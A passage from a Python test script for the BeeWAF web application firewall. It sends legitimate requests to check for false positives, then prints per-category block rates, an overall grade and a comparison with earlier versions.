send("GET", "/api/categories?lang=en", category=cat, expect_block=False, desc="Category listing")
send("GET", "/api/user/profile", category=cat, expect_block=False, desc="User profile")
send("GET", "/api/notifications?unread=true", category=cat, expect_block=False, desc="Notifications")
send("POST", "/api/cart/add", body='{"product_id":123,"quantity":2}', headers={"Content-Type": "application/json"}, category=cat, expect_block=False, desc="Add to cart")

# Normal headers
send("GET", "/", headers={"Accept-Language": "en-US,en;q=0.9"}, category=cat, expect_block=False, desc="Normal Accept-Language")
send("GET", "/", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, category=cat, expect_block=False, desc="Normal User-Agent")

# Edge cases that should NOT be blocked
send("GET", "/search?q=O'Reilly+Media", category=cat, expect_block=False, desc="Apostrophe in name")
send("GET", "/search?q=100%25+cotton+shirt", category=cat, expect_block=False, desc="Percent in search")
send("GET", "/search?q=C%2B%2B+programming", category=cat, expect_block=False, desc="C++ search")
send("GET", "/search?q=rock+%26+roll+music", category=cat, expect_block=False, desc="Ampersand in search")
send("GET", "/search?q=2+%2B+2+%3D+4", category=cat, expect_block=False, desc="Math expression")
send("POST", "/api/comment", body='{"text":"This product is great! I love it <3"}', headers={"Content-Type": "application/json"}, category=cat, expect_block=False, desc="Heart emoticon")
send("GET", "/search?q=the+lord+of+the+rings+return+of+the+king", category=cat, expect_block=False, desc="Movie title search")
send("GET", "/api/article/how-to-select-the-best-union-insurance", category=cat, expect_block=False, desc="URL with SQL keywords")
send("GET", "/search?q=drop+shipping+business+guide", category=cat, expect_block=False, desc="Drop shipping search")

fp_count = stats[cat]["total"]
fp_blocked = stats[cat]["blocked"]
fp_passed = stats[cat]["total"] - stats[cat]["blocked"]
print(f"  Legitimate traffic: {fp_passed}/{stats[cat]['total']} passed (should be {stats[cat]['total']})")
if fp_blocked > 0:
    print(f"  ⚠️  FALSE POSITIVES: {fp_blocked}")


# ═══════════════════════════════════════════════════════════════════════
# FINAL RESULTS
# ═══════════════════════════════════════════════════════════════════════
print("\n")
print("═" * 70)
print("  BEEWAF 10,038 RULES - COMPREHENSIVE TEST RESULTS")
print("═" * 70)

# Separate attack tests from FP tests
attack_total = 0
attack_blocked = 0
for cat_name, cat_stats in sorted(stats.items()):
    if cat_name == "FP_Legitimate":
        continue
    attack_total += cat_stats["total"]
    attack_blocked += cat_stats["blocked"]
    rate = (cat_stats["blocked"] / cat_stats["total"] * 100) if cat_stats["total"] > 0 else 0
    status = "✅" if rate >= 80 else "⚠️" if rate >= 60 else "❌"
    print(f"  {status} {cat_name:25s}: {cat_stats['blocked']:3d}/{cat_stats['total']:3d} blocked ({rate:5.1f}%)")

print(f"\n{'─' * 70}")

# Overall attack detection
attack_rate = (attack_blocked / attack_total * 100) if attack_total > 0 else 0
print(f"\n  🎯 ATTACK DETECTION RATE: {attack_blocked}/{attack_total} ({attack_rate:.1f}%)")

# False positive rate
fp_stats = stats["FP_Legitimate"]
fp_rate = (fp_stats["blocked"] / fp_stats["total"] * 100) if fp_stats["total"] > 0 else 0
print(f"  🛡️  FALSE POSITIVE RATE:  {fp_stats['blocked']}/{fp_stats['total']} ({fp_rate:.1f}%)")
if fp_details:
    print(f"\n  False Positive Details:")
    for fp in fp_details:
        print(f"    {fp}")

# Grade calculation
if attack_rate >= 98 and fp_rate <= 2:
    grade = "A+"
elif attack_rate >= 95 and fp_rate <= 5:
    grade = "A"
elif attack_rate >= 90 and fp_rate <= 10:
    grade = "A-"
elif attack_rate >= 85:
    grade = "B+"
elif attack_rate >= 80:
    grade = "B"
elif attack_rate >= 70:
    grade = "C"
else:
    grade = "D"

print(f"\n  📊 TOTAL RULES: 10,038 compiled")
print(f"  📊 ATTACKS TESTED: {attack_total}")
print(f"  📊 LEGITIMATE REQUESTS: {fp_stats['total']}")
print(f"\n  🏆 FINAL GRADE: {grade}")
print(f"  🏆 SCORE: {attack_rate:.1f}/100")

# Compare with previous versions
print(f"\n{'─' * 70}")
print(f"  VERSION COMPARISON:")
print(f"  ├── v4.0 (2,500 rules):   82.5/100 (beat F5 BIG-IP ASM 73/100)")
print(f"  ├── v5.0 (4,864 rules):   98.3/100 (A+ grade, 70/70)")
print(f"  └── v6.0 (10,038 rules):  {attack_rate:.1f}/100 ({grade} grade, {attack_blocked}/{attack_total})")
print(f"{'═' * 70}")
